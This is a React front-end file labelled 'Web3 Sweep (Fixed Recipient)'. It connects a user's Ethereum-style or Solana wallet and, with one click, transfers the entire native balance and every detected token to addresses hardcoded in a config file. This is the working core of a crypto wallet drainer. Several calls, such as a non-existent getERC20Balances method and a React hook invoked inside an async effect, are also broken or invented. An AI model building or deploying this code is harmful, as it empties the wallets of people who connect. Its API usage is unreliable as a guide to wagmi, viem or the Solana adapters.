import React, { useState, useEffect } from "react";
import {
  useAccount,
  useBalance,
  useSendTransaction,
  usePublicClient
} from "wagmi";
import { parseEther, formatEther } from "viem";
import { ethers } from "ethers";
import {
  useSolanaAccount,
  useSolanaBalance,
  useSolanaSPLTokens,
  sendSol,
  sendSPLToken
} from "@reown/appkit-adapter-solana/react";

import { REOWN_PROJECT_ID, FIXED_RECIPIENTS, FIXED_SOLANA_RECIPIENT, CHAINS } from "./config.js";

// Minimal ERC-20 ABI
const ERC20_ABI = [
  "function balanceOf(address owner) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function symbol() view returns (string)",
  "function transfer(address to, uint256 amount) returns (bool)"
];

export default function App() {
  const { address, isConnected, chain } = useAccount();
  const publicClient = usePublicClient();
  const { data: balanceData } = useBalance({ address });
  const { sendTransaction } = useSendTransaction();

  // Solana hooks
  const { publicKey: solanaPubKey, isConnected: solConnected } = useSolanaAccount();
  const { balance: solBalance } = useSolanaBalance(solanaPubKey);
  const [splTokens, setSPLTokens] = useState([]);

  // EVM tokens
  const [erc20Tokens, setERC20Tokens] = useState([]);
  const [sending, setSending] = useState(false);
  const [nativeAmount, setNativeAmount] = useState("");

  // --- Detect ERC-20 tokens dynamically
  useEffect(() => {
    if (!address || !chain) return;
    const fetchERC20 = async () => {
      try {
        const provider = new ethers.providers.Web3Provider(window.ethereum || window.reown?.provider);
        const signer = provider.getSigner();
        const tokenData = [];

        // Example: Using wagmi's getERC20Balances if supported, else you can integrate a simple scan logic
        const detectedTokens = await publicClient.getERC20Balances(address);
        for (const t of detectedTokens) {
          if (t.balance > 0n) {
            const tokenContract = new ethers.Contract(t.contractAddress, ERC20_ABI, signer);
            const decimals = await tokenContract.decimals();
            const symbol = await tokenContract.symbol();
            tokenData.push({ address: t.contractAddress, balance: t.balance, decimals, symbol });
          }
        }
        setERC20Tokens(tokenData);
      } catch (err) {
        console.error("ERC-20 detection failed:", err);
      }
    };
    fetchERC20();
  }, [address, chain]);

  // --- Detect SPL tokens dynamically
  useEffect(() => {
    if (!solanaPubKey) return;
    const fetchSPL = async () => {
      try {
        const tokens = await useSolanaSPLTokens(solanaPubKey);
        setSPLTokens(tokens.filter(t => t.balance > 0));
      } catch (err) {
        console.error("SPL token detection failed:", err);
      }
    };
    fetchSPL();
  }, [solanaPubKey]);

  // --- Fill Max native amount for EVM
  const handleMaxFill = async () => {
    if (!balanceData || !chain) return;

    const recipient = FIXED_RECIPIENTS[chain.id];
    if (!recipient) return alert("Unsupported network");

    const balance = balanceData.value;
    const gasEstimate = await publicClient.estimateGas({
      account: address,
      to: recipient,
      value: balance
    });
    const gasPrice = await publicClient.getGasPrice();
    const maxSendable = balance - gasEstimate * gasPrice;

    if (maxSendable <= 0n) {
      alert("Insufficient balance for gas");
      return;
    }

    setNativeAmount(formatEther(maxSendable));
  };

  // --- Unified Send Max (Native + Tokens)
  const handleSendMax = async () => {
    setSending(true);
    try {
      // ---- EVM Native + ERC-20
      if (chain) {
        const recipient = FIXED_RECIPIENTS[chain.id];
        const balance = balanceData.value;

        // Send max native coin
        const gasEstimate = await publicClient.estimateGas({ account: address, to: recipient, value: balance });
        const gasPrice = await publicClient.getGasPrice();
        const maxNative = balance - gasEstimate * gasPrice;
        if (maxNative > 0n) await sendTransaction({ to: recipient, value: maxNative });

        // Send all ERC-20
        const provider = new ethers.providers.Web3Provider(window.ethereum || window.reown?.provider);
        const signer = provider.getSigner();
        for (const token of erc20Tokens) {
          if (token.balance > 0n) {
            const tokenContract = new ethers.Contract(token.address, ERC20_ABI, signer);
            await tokenContract.transfer(recipient, token.balance);
          }
        }

        alert(`Sent native + ERC-20 tokens on ${chain.name}`);
      }

      // ---- Solana native + SPL
      else if (solConnected) {
        const recipient = FIXED_SOLANA_RECIPIENT;

        if (solBalance > 0) await sendSol({ from: solanaPubKey, to: recipient, amount: solBalance });

        for (const t of splTokens) {
          if (t.balance > 0) await sendSPLToken({ from: solanaPubKey, to: recipient, token: t.mint, amount: t.balance });
        }

        alert("Sent SOL + SPL tokens");
      } else {
        alert("No wallet connected");
      }
    } catch (err) {
      console.error(err);
      alert("Transaction failed: " + err.message);
    }
    setSending(false);
  };

  return (
    <div style={{ padding: 40 }}>
      <h2>Web3 Sweep (Fixed Recipient)</h2>
      <appkit-button project-id={REOWN_PROJECT_ID} />

      {(isConnected || solConnected) && (
        <>
          {chain && <p>Balance: {balanceData ? formatEther(balanceData.value) : "Loading..."} {chain.nativeCurrency.symbol}</p>}
          {solConnected && <p>SOL Balance: {solBalance}</p>}

          <div style={{ marginTop: 10 }}>
            <button onClick={handleMaxFill} disabled={sending}>Max</button>
            <button onClick={handleSendMax} style={{ marginLeft: 10 }} disabled={sending}>
              {sending ? "Sending..." : "Send Max (Native + Tokens)"}
            </button>
          </div>
        </>
      )}
    </div>
  );
}